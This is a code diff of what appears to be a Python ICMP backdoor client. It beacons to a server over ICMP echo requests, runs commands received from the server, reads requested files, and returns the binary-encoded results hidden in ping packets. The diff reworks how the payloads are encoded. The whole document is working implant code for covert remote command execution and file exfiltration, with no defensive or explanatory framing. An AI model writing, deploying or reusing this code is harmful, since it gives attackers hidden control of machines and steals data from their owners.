@@ -10,10 +10,10 @@ def read_file(file_name):
         return f.read()
         
 
-
 def send_beacon(addr,data):
     while cond == 0:
-        pkt_send(dest=SERVER_ADR,data="beacon",icmp_type="echo-request",id_packet=BEACON)
+        pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
+        pkt_send(pkt_no_data,data)
         print("send beacon")
         time.sleep(5)
     
@@ -24,18 +24,24 @@ def parse_packet(packet):
         global cond
         cond = 1
         print("cond changed to " + str(cond))
-        type_packet = check_type(packet)
+        
+        prefix_packet = check_prefix(packet)     
         data_recieved = extract_data(packet)
-        if type_packet == RUN:
-            pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_OUTPUT)
-            output = RunCommand(data_recieved)
-            pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
-            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)
-        elif type_packet == FILE:
-            pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_FILE)
-            output = read_file(data_recieved)
-            pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
-            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)
+        bin_name = str_to_binary(data_recieved)
+        pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
+        txt_recieved = bin_to_str(data_recieved)
+        if prefix_packet == RUN:
+            output = RunCommand(txt_recieved)
+            bin_output = str_to_binary(output) 
+            pkt_send(pkt_no_data,BEGIN_OUTPUT + bin_name)
+            pkt_send(pkt_no_data,IN_TRANSFER + bin_output)
+            pkt_send(pkt_no_data,EF)
+        elif prefix_packet == FILE:
+            output = read_file(txt_recieved)
+            bin_output = str_to_binary(output)
+            pkt_send(pkt_no_data,BEGIN_FILE + bin_name)
+            pkt_send(pkt_no_data,IN_TRANSFER + bin_output)
+            pkt_send(pkt_no_data,EF)
 
         cond = 0
         print("cond changed to " + str(cond))
